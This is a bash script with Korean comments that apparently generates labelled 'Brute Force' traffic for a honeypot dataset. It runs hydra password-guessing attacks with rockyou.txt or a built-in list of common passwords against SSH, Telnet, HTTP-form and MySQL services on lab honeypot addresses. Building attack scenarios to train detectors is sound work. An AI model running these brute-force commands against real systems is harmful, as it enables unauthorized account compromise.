#!/bin/bash
# 시나리오 03: SSH/HTTP/MySQL 브루트포스
# Label: Brute Force
# 도구: hydra
# 설명: Cowrie(SSH), Heralding(HTTP/MySQL)을 대상으로 hydra 브루트포스

LABEL="Brute Force"
SCENARIO="brute_force"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

WORDLIST="/usr/share/wordlists/rockyou.txt"

# rockyou.txt 존재 확인
if [ ! -f "$WORDLIST" ]; then
    echo "[!] rockyou.txt not found, using inline wordlist"
    WORDLIST="/tmp/passwords.txt"
    echo -e "password\n123456\nadmin\nroot\nletmein\nqwerty\nmonkey\nmaster\npassword1\n12345678\nabc123\niloveyou\nhello\nofficer\nsecret\n1234\nadmin123\npassword123\ntest\nuser" > "$WORDLIST"
fi

# SSH 브루트포스 (Cowrie:2222)
echo "[*] SSH brute force against Cowrie (172.30.0.10:2222)"
hydra -l root -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_ssh_root.txt \
    ssh://172.30.0.10:2222 \
    -e nsr 2>/dev/null || true

hydra -l admin -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_ssh_admin.txt \
    ssh://172.30.0.10:2222 \
    -e nsr 2>/dev/null || true

# HTTP 폼 브루트포스 (Heralding:80)
echo "[*] HTTP brute force against Heralding (172.30.0.11:80)"
hydra -l admin -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_http.txt \
    http-post-form://172.30.0.11/login:username=^USER^&password=^PASS^:Invalid \
    2>/dev/null || true

# MySQL 브루트포스 (Heralding:3306)
echo "[*] MySQL brute force against Heralding (172.30.0.11:3306)"
hydra -l root -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_mysql.txt \
    mysql://172.30.0.11:3306 \
    2>/dev/null || true

# Cowrie Telnet 브루트포스 (추가)
echo "[*] Telnet brute force against Cowrie (172.30.0.10:2223)"
hydra -l admin -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_telnet.txt \
    telnet://172.30.0.10:2223 \
    2>/dev/null || true

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
